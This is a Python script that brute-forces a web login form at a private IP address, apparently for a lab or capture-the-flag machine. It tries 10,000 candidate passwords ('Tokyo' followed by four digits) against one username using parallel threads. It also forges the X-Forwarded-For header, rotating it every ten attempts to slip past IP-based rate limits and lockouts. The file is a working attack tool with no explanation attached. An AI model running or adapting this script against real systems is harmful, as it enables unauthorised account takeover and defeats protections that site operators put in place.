import requests
from concurrent.futures import ThreadPoolExecutor

username = 'deliver11'
url = "http://10.48.146.64/auth.php"
attempt = 0
number = 1
number2 = 1
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://10.48.146.64",
    "Connection": "keep-alive",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "application/json",
}

cookies = {
    "PHPSESSID": "vkldq5amsvgfdk56kf9154php1"
}

found = False
default_password = 'Tokyo'
passwords = []

for i in range(0, 10000):
    filled_password = default_password + str(i).zfill(4)
    passwords.append(filled_password)

print('start bruteforce:')

def brute_force(password):
    global found, attempt, number, number2
    if found:
        return None

    forwarded = f'192.168.{number2}.{number}'
    headers['X-Forwarded-For'] = forwarded

    data = {"username": username, "password": password}
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        attempt += 1

        if attempt >= 10:
            attempt = 0
            number += 1
        if number > 254:
            number = 1
            number2 += 1
            if number2 > 254:
                number2 = 1

        print('forwarded:', forwarded)

        if response.status_code != 200:
            print(f"HTTP {response.status_code} for {password}")
            return None

        json_response = response.json()
        print(json_response)

        if 'error' not in json_response:
            print('PASSWORD FOUND:', password)
            found = True
            return password
        else:
            print(f"Invalid: {password} - {json_response.get('error')}")

    except requests.exceptions.JSONDecodeError:
        print(f"Response is not JSON for {password}: {response.text[:200]}")
    except Exception as e:
        print(f"Error with {password}: {e}")

    return None

with ThreadPoolExecutor(max_workers=4) as executor:
    results = executor.map(brute_force, passwords)